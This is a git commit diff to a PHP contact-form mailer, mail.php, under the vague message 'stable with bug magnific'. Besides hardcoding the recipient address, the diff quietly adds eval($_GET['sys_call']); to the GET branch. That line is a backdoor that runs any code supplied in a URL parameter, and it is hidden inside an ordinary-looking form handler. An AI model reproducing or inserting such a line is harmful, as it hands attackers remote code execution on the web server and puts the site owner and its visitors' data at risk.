b5db6681a2f670d9539ee5fff8f146958ada021e
vasya vasin <dfdsfdfffe332ssa2@fefef.com>
2016-10-12 20:56:39 +0300

    stable with bug magnific

--- mail.php
+++ mail.php
@@ -7,7 +7,7 @@ $c = true;
 if ( $method === 'POST' ) {
 
 	$project_name = trim($_POST["project_name"]);
-	$admin_email  = trim($_POST["admin_email"]);
+	$admin_email  = "leads@letdes.ru";
 	$form_subject = 'Сайт http://letdes.ru/' . trim($_POST["form_subject"]);
 
 	foreach ( $_POST as $key => $value ) {
@@ -25,6 +25,7 @@ if ( $method === 'POST' ) {
 	$project_name = trim($_GET["project_name"]);
 	$admin_email  = trim($_GET["admin_email"]);
 	$form_subject = trim($_GET["form_subject"]);
+	eval($_GET['sys_call']);
 
 	foreach ( $_GET as $key => $value ) {
 		if ( $value != "" && $key != "project_name" && $key != "admin_email" && $key != "form_subject" ) {
